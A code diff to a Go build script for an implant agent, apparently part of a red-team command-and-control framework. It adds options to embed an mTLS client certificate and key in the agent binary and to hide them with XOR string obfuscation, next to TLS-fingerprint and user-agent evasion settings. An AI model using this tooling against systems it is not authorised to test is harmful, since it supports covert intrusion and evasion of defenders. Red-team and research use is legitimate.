@@ -159,6 +159,15 @@ func buildConfigLdflags(payloadBuildMsg agentstructs.PayloadBuildMessage, fawkes
 	if tlsFP, err := payloadBuildMsg.BuildParameters.GetStringArg("tls_fingerprint"); err == nil && tlsFP != "" && tlsFP != "go" {
 		ldflags += fmt.Sprintf(" -X '%s.tlsFingerprint=%s'", fawkesMainPackage, tlsFP)
 	}
+	// mTLS client certificate (base64-encode PEM to survive ldflags)
+	if mtlsCert, err := payloadBuildMsg.BuildParameters.GetStringArg("mtls_cert"); err == nil && mtlsCert != "" {
+		encoded := base64.StdEncoding.EncodeToString([]byte(mtlsCert))
+		ldflags += fmt.Sprintf(" -X '%s.mtlsCertPEM=%s'", fawkesMainPackage, encoded)
+	}
+	if mtlsKey, err := payloadBuildMsg.BuildParameters.GetStringArg("mtls_key"); err == nil && mtlsKey != "" {
+		encoded := base64.StdEncoding.EncodeToString([]byte(mtlsKey))
+		ldflags += fmt.Sprintf(" -X '%s.mtlsKeyPEM=%s'", fawkesMainPackage, encoded)
+	}
 
 	// TCP P2P bind address
 	if tcpBind, err := payloadBuildMsg.BuildParameters.GetStringArg("tcp_bind_address"); err == nil && tcpBind != "" {
@@ -354,6 +363,15 @@ func applyStringObfuscation(payloadBuildMsg agentstructs.PayloadBuildMessage, fa
 	}
 	if uap, err := payloadBuildMsg.BuildParameters.GetStringArg("user_agent_pool"); err == nil && uap != "" {
 		obfVars = append(obfVars, obfVar{"userAgentPool", strings.ReplaceAll(uap, "'", "")})
+	}
+	// mTLS cert/key (already base64 in ldflags, obfuscate the base64 string)
+	if mtlsCert, err := payloadBuildMsg.BuildParameters.GetStringArg("mtls_cert"); err == nil && mtlsCert != "" {
+		encoded := base64.StdEncoding.EncodeToString([]byte(mtlsCert))
+		obfVars = append(obfVars, obfVar{"mtlsCertPEM", encoded})
+	}
+	if mtlsKey, err := payloadBuildMsg.BuildParameters.GetStringArg("mtls_key"); err == nil && mtlsKey != "" {
+		encoded := base64.StdEncoding.EncodeToString([]byte(mtlsKey))
+		obfVars = append(obfVars, obfVar{"mtlsKeyPEM", encoded})
 	}
 
 	// Replace plaintext values in ldflags with XOR-encoded versions
